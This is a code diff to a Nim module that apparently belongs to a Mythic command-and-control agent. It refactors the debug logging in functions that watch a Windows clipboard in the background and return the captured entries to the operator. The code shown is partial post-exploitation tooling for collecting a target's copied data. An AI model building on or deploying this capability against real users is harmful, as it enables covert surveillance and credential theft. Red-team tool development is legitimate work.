@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, times, sets, os, tables]
 
 when defined(windows):
@@ -52,8 +52,6 @@ proc getClipboardText(): string =
 proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
   ## Start clipboard monitoring for a specified duration (Windows only)
   ## This runs as a background task and doesn't block the agent
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       let args = to(params, ClipboardMonitorArgs)
@@ -64,8 +62,7 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
       if clipboardMonitorActive:
         return mythicError(taskId, "Clipboard monitor is already running")
       
-      if cfg.debug:
-        echo "[DEBUG] Starting clipboard monitor for ", args.duration, " seconds (non-blocking)"
+      debug &"[DEBUG] Starting clipboard monitor for {args.duration} seconds (non-blocking)"
       
       # Initialize monitoring state
       clipboardMonitorState = ClipboardMonitorState(
@@ -104,8 +101,6 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
 proc checkClipboardMonitor*(taskId: string): JsonNode =
   ## Check clipboard monitor status and return results when complete
   when defined(windows):
-    let cfg = getConfig()
-    
     if not clipboardMonitorActive:
       return nil
     
@@ -118,8 +113,7 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
         clipboardMonitorState.output.add(output)
         clipboardMonitorState.lastClip = currentClip
         
-        if cfg.debug:
-          echo "[DEBUG] New clipboard content detected, returning immediately"
+        debug "[DEBUG] New clipboard content detected, returning immediately"
         
         # Return immediately with new clipboard data (still processing)
         return %*{
@@ -140,8 +134,7 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
       else:
         finalOutput = "Clipboard monitoring completed. Total unique entries captured: " & $clipboardMonitorState.seenClips.len
       
-      if cfg.debug:
-        echo "[DEBUG] Clipboard monitoring completed"
+      debug "[DEBUG] Clipboard monitoring completed"
       
       return mythicSuccess(taskId, finalOutput)
     
